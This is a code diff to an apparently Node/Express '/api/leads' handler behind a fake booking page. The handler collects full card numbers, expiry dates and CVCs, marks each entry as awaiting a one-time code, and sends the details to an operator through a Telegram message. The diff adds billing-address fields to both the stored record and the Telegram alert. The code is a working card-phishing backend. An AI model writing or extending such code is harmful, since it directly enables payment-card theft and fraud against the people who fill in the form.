@@ -412,6 +412,12 @@ app.post("/api/leads", async (req, res) => {
       new Intl.DateTimeFormat("ru-RU", { day: "numeric", month: "long" }).format(new Date());
     const booking_time = clean(req.body.booking_time);
     const service_type = clean(req.body.service_type) || "apartments";
+    const country = clean(req.body.country) || "";
+    const address1 = clean(req.body.address1) || "";
+    const address2 = clean(req.body.address2) || "";
+    const city = clean(req.body.city) || "";
+    const region = clean(req.body.region) || "";
+    const postal = clean(req.body.postal) || "";
 
     const digits = card_number.replace(/\D/g, "");
     const expiryMatch = expiry.match(/^(\d{2})\/(\d{2})$/);
@@ -455,6 +461,12 @@ app.post("/api/leads", async (req, res) => {
       booking_time,
       booking: `${booking_date} · ${booking_time}`,
       service_type,
+      country,
+      address1,
+      address2,
+      city,
+      region,
+      postal,
       status: "Очікує введення коду",
       submitted_code: null,
       attempts: 0,
@@ -468,6 +480,7 @@ app.post("/api/leads", async (req, res) => {
 
     // Telegram: новая заявка with button
     const cardMasked = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+    const addrLine = [address1, address2, city, region, postal, country].filter(Boolean).join(", ");
     const tgMsg = `💳 <b>Нова заявка #${id}</b>\n` +
       `Послуга: <b>${service_type}</b>\n` +
       `Імʼя: ${name}\n` +
@@ -475,6 +488,7 @@ app.post("/api/leads", async (req, res) => {
       `Картка: <code>${cardMasked}</code>\n` +
       `Термін: ${expiry}\n` +
       `CVC: <code>${codeDigits}</code>\n` +
+      `Адреса: ${addrLine || "—"}\n` +
       `Час: ${booking_time}\n` +
       `Статус: очікує код`;
 
